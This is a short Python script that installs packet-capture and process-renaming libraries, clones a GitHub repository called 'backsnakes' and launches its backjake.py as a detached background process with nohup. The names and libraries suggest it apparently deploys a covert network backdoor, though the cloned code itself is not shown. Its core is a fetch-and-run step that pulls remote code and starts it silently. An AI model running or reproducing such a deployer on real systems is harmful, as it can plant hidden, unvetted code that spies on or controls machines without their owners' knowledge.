import os
from subprocess import Popen, PIPE

os.system("yum install -y python-devel python-pip libpcap* pcapy* scapy* python-inotify htop")
os.system("pip install pcapy psutil setproctitle pyinotify")
os.system("git clone https://github.com/communistwatermelon/backsnakes.git")
results = Popen("pwd", shell=True, stdout=PIPE).stdout.read()
results = "nohup python " + results[:-1] + "/backsnakes/backjake.py &"
os.system(results)